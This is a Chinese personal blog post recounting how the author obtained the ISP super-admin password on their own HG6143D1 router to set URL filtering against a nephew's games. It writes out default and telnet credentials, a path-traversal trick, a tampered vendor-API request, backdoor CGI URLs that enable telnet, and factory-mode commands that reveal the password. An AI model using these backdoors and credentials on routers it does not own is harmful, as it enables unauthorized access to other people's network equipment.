@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <!-- RSS / Atom -->
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      renderMathInElement(document.body, {
+        delimiters: [
+          {left: "$$", right: "$$", display: true},
+          {left: "\\[", right: "\\]", display: true},
+          {left: "$",  right: "$",  display: false},
+          {left: "\\(", right: "\\)", display: false}
+        ],
+        throwOnError: false,   // 避免个别符号导致整段失败
+        macros: {
+          "\\sgn": "\\operatorname{sgn}"  // 你文中用到的 sgn，统一为运算符
+        }
+      });
+    });
+  </script> -->
+    <!-- <script>
+      window.MathJax = {
+        tex: {
+          packages: {'[+]': ['ams']},   // cases / aligned 需要 ams
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$','$$'], ['\\[','\\]']],
+          tags: 'ams'
+        },
+        options: { skipHtmlTags: ['script','style','textarea','pre','code'] }
+      };
+    </script>
+    <script async id="MathJax-script"
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script> -->
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <title>现充|junyu33</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="head-nav">
+	<div class="inner">
+		<a href="/">
+			现充|junyu33
+		</a>
+		<div class="right">
+			
+				<a href="/zh">首页</a>
+				<a href="/zh/archives">归档</a>
+				
+					<a href="/zh/categories">Categories</a>
+				
+				
+					<a href="/zh/tags">Tags</a>
+				
+				<a href="/">English</a>
+			
+		</div>
+	</div>
+</div>
+
+  <div class="main">
+    <div class="post">
+    
+
+	<h1>HG6143D1 型号路由器获得超级管理员密码</h1>
+	<p>因为嫌未满18岁的外甥外放抖音太吵，并且打网游上瘾，我决定在力所能及的范围内采取一些措施。</p>
+<p>例如尝试编辑电信路由器的防火墙，将游戏对应的域名设为禁止访问。</p>
+<p>这里写一下探索的过程，正解会放在最后一节。</p>
+<span id="more"></span>
+<h2 id="虚假的管理界面">虚假的管理界面</h2>
+<p>我先前在路由器背面看到了终端管理界面的用户名<code>useradmin</code>和密码（一个5位纯字母），访问<code>http://192.168.1.1</code>是可以进入的。然而，当你遍历完路由器的所有设置后：</p>
+<img src='https://img.junyu33.me/blog/router/image.png'>
+<p>发现并没有一个任何一个设置与路由器的防火墙有关，甚至唯一一个稍微有点作用的就是修改 WiFi 密码。所以这个管理界面仅仅只是起到了满足部分人的虚荣心的作用，功能是极度鸡肋的。</p>
+<p>通过 STFW 后得知，我们的登录用户<code>useradmin</code>仅仅只是普通用户，而想要得到真正的“管理界面”，需要以“超级管理员”<code>telecomadmin</code>登录并且输入正确的密码。于是接下来这几节便陷入了寻找“超级管理员”密码的漫漫征途中。</p>
+<h2 id="成功方法0：人情世故">成功方法0：人情世故</h2>
+<p>理论上最快的方法是——专业的事情交给专业的人来解决。给宽带师傅发红包或者打电话问客服，有几率可以成功。例如：</p>
+<blockquote>
+<p>我这恰好前些天让整的iptv，用了十多年的老电信用户了，最早的那种电视盒子以后就再没给换过，我找客服说这个事情，然后来给我装盒子的那个师傅是我初中同学，就加了个微信，折腾的那几天，网上的方案试了个遍都不行，我有点不好意思找那个师傅，因为说熟悉吧，又不是那么熟，我先建议的小黄鱼的，十块钱给我查，但是当天太晚了没弄成，说第二天查到了发我，结果说他们那边程序抽风，查不到，给我退了，建议我建议宽带师傅，我厚着脸皮问了一下我那老同学，很爽快的直接给我查了，让我不要乱改，说这个原本给我也是不合规的，我进去第一时间删除了tr069，然后研究半天，单线复用，telnet也开了并且固定了，现在内网里iptv所有设备都可以用，iptv盒子也可以正常用，美滋滋[吃瓜]</p>
+<p>Okay-Alone: <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av114002340354203/">https://www.bilibili.com/video/av114002340354203/</a></p>
+</blockquote>
+<p><s>但这样做就暴露我要对网络动手脚的意图了，会被外甥发现。</s></p>
+<h2 id="失败方法1：默认密码">失败方法1：默认密码</h2>
+<p>ATFAI（Ask The F**king AI）后得知，作为电信设备，<code>telecomadmin</code>的默认密码是<code>nE7jA%5m</code>，我尝试了一下，密码错误。</p>
+<p>又一次 STFW 后得到，“超级管理员”的默认密码的确是<code>nE7jA%5m</code>不错，但是光纤入网后，密码会被重新修改成一个含字母、数字和特殊字符的8位字符串，即使抓包来暴力破解在时间成本上也不可行。（当然你可以选择恢复路由器的出厂设置再登录，<s>但这样就会被外甥发现了</s>）</p>
+<p>在B站上一搜，果然有很多尝试获取电信宽带管理员密码的视频，我总结一下主要有三类解法，展示如下：</p>
+<h2 id="失败方法2：路径穿越">失败方法2：路径穿越</h2>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Zu411m72m/">视频链接</a>。</p>
+<p>学过路径穿越漏洞知识的同学都知道，我们可以通过<code>..</code>来返回父文件夹，再多循环几次<code>../../../../</code>就可以到根目录了。于是这里来了一个实际的案例：</p>
+<p>首先，我的路由器是可以允许插一个U盘的，而web界面是可以访问这个U盘的内容的，因此，我们可以提前在这个U盘里放一个文件夹（例如<code>UMR</code>），然后在浏览器前端的js函数（例如<code>openfile('UMR', false)</code>），将其修改为<code>openfile('..', false)</code>，这样理论上就可以访问到这个文件夹的上一级。如果成功的话，改为<code>openfile('../../../../', false)</code>就可以到根目录了，这意味着你拥有了访问任意路径的权限。而管理员密码会以明文保存在某个文件中，只需将整个系统目录拷贝到U盘中慢慢查找即可。</p>
+<p>然而事与愿违，我这里的情况是改为<code>openfile('..', false)</code>后界面没有任何显示，而如果改为<code>openfile('../../../path/to/usb', false)</code>后，U盘的内容又重新显示出来。因此我估计后端的逻辑重写了一遍，过滤了U盘路径之外的任何内容——这个漏洞已经被修复了，该方法失败。</p>
+<h2 id="失败方法3：App抓包">失败方法3：App抓包</h2>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av984644141/">视频链接</a></p>
+<p>该视频的思路是，下载路由器官方的app“小翼管家”，绑定路由器后进入路由器管理界面，里面有个开关路由器指示灯的选项。这个时候开始抓包，然后选取某个发往天翼服务器的包，将内容改为尝试查询管理员密码的 json 字符串并重新发包，这样 response 中就能看到正确的管理员密码。</p>
+<p>为了搭建实验环境，我使用了四年前那个已经 root 并且安装 xposed 框架的旧手机，并在手机和电脑都安装了抓包软件 reqable。我们需要在安卓手机中安装解码 https 的 CA 证书（这一点我使用了安装 xposed 模块的方法），并将手机和电脑配对以方便将手机的发包命令在电脑上操作。我们抓到了若干与服务器通信的包，例如：</p>
+<pre><code>POST /device/api?token=??????&amp;MAC=??????? HTTP/1.1
+Content-Type: application/json
+SDKVersion: 3.6.2
+phoneNum: ???????????
+phoneOS: Android
+systemVersion: 7.0
+AppKey: ???????????
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; STF-AL10 Build/HUAWEISTF-AL10)
+Host: nos10-2.189cube.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 187
+
+&#123;&quot;InterfaceName&quot;:&quot;com.ctc.igd1.SleepTimer&quot;,&quot;ObjectPath&quot;:&quot;/com/ctc/igd1/Config/Power/SleepTimers&quot;,&quot;RPCMethod&quot;:&quot;GetProperitesOfSubObjects&quot;,&quot;SequenceId&quot;:&quot;31629&quot;,&quot;ServiceName&quot;:&quot;com.ctc.igd1&quot;&#125;
+</code></pre>
+<p>于是我们按照网上的操作，将最后一行的json字符串改为：</p>
+<pre><code class="language-json">&#123;
+  &quot;Params&quot;: [],
+  &quot;MethodName&quot;: &quot;GetTAPasswd&quot;,
+  &quot;RPCMethod&quot;: &quot;CallMethod&quot;,
+  &quot;ObjectPath&quot;: &quot;/com/ctc/igd1/Telecom/System&quot;,
+  &quot;Interfacename&quot;: &quot;com.ctc.igd1.SysCmd&quot;,
+  &quot;ServiceName&quot;: &quot;com.ctc.igd1&quot;
+&#125;
+</code></pre>
+<p>于是，我们得到了以下结果：</p>
+<img src='https://img.junyu33.me/blog/router/image-1.png'>
+<p>我尝试了修改请求头的部分参数，发现影响输出结果的仅仅与POST参数的<code>token</code>与<code>MAC</code>有关。随意修改<code>token</code>会输出 token 无效，修改 <code>MAC</code> 会提示该设备未注册，而尝试16进制解码<code>token</code>也没发现什么端倪——这意味着发包的漏洞似乎也被修复了，该方法失败。</p>
+<h2 id="成功方法1：尝试后门">成功方法1：尝试后门</h2>
+<p>我通过B站视频以及<code>HG6143D1</code>作为关键字搜索等方式，尝试了以下可能的后门链接（记得关闭代理）：</p>
+<pre><code>http://192.168.1.1:8080/
+http://192.168.1.1:8080/cgi-bin/abcdidfope94e0934jiewru8ew414.cgi
+http://192.168.1.1:8080/cgi-bin/telnetenable.cgi?key=HG6143D1&amp;telnetenable=1
+http://192.168.1.1:8080/cgi-bin/telnetenable.cgi?telnetenable=1&amp;key=&lt;光猫MAC地址不带符号&gt;
+</code></pre>
+<p>第一个页面空白半天加载不出来，第二个与第三个404，最后一个显示“telnet已开启”——终于成功了。于是我便按照提供第四个链接的<a target="_blank" rel="noopener" href="https://juejin.cn/post/7409828788126892041">教程</a>进行接下来的操作：</p>
+<ol>
+<li>进入wsl，输入<code>telnet 192.168.1.1</code>，用户名<code>telnetadmin</code>，密码<code>FH-nE7jA%5mXXXXXX</code>，其中<code>XXXXXX</code>替换为MAC地址的后六位去掉冒号</li>
+<li>进入工厂模式，输入<code>load_cli factory</code></li>
+<li>此时 shell 由 <code>$</code> 变为 <code>#</code>，输入 <code>show admin_pwd</code> 显示管理员密码。</li>
+</ol>
+<p>我这边的情况如下：</p>
+<pre><code>junyu33@zjy-asus /m/c/U/j/Desktop&gt; telnet 192.168.1.1                                                            (base)
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+Login:telnetadmin
+Password:
+$load_cli factory
+cli main init.....argc=2 /r/n
+consoleFd = -1
+----cli_main_begin 488 -1
+cannot   open   (fh-bin)confile
+cl_run_memfile_config  unlocked success!
+Config\factorydir# show admin_pwd
+Success! admin_pwd=????????
+Config\factorydir# 
+</code></pre>
+<p>于是我们便拿到了管理员密码，浏览器输入<code>http://192.168.1.1</code>进入登录界面，输入超级管理员用户名<code>telecomadmin</code>和密码即可进入真正而丑陋的管理界面：</p>
+<img src='https://img.junyu33.me/blog/router/image-3.png'>
+<p>接下来的工作就简单了，进入“安全”-&gt;“URL过滤”，启用之。ATFAI一下外甥玩的游戏，以及播放抖音视频对应的URL，一个一个添加进去即可。</p>
+<img src='https://img.junyu33.me/blog/router/image-4.png'>
+</div>
+
+
+  </div>
+</body>
+</html>
+
